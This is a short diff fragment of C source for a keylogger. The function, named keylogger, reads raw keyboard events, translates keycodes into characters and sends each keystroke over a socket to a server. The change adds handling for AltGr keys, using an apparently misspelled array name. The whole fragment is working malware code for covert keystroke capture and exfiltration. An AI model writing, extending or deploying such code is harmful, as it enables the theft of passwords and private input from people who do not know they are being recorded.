@@ -14,8 +14,6 @@
 #define SHIFT(key) ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))
 #define ALTGR(key) (key == KEY_RIGHTALT)
 
-
-
 static int running;
 static int keyboard_fd;
 
@@ -72,9 +70,10 @@ const void keylogger()
 
             if (shift_flag && !altgr_flag && !SHIFT(event.code))
                 strcpy(client_message, shifted_keycodes[event.code]);
-
             else if (!shift_flag && !altgr_flag && !SHIFT(event.code))
                 strcpy(client_message, keycodes[event.code]);
+            else if (!shift_flag && altgr_flag && !SHIFT(event.code))
+                strcpy(client_message, alrgr_keycodes[event.code]);
 
             send_message(sock, serv, client_message);
         }
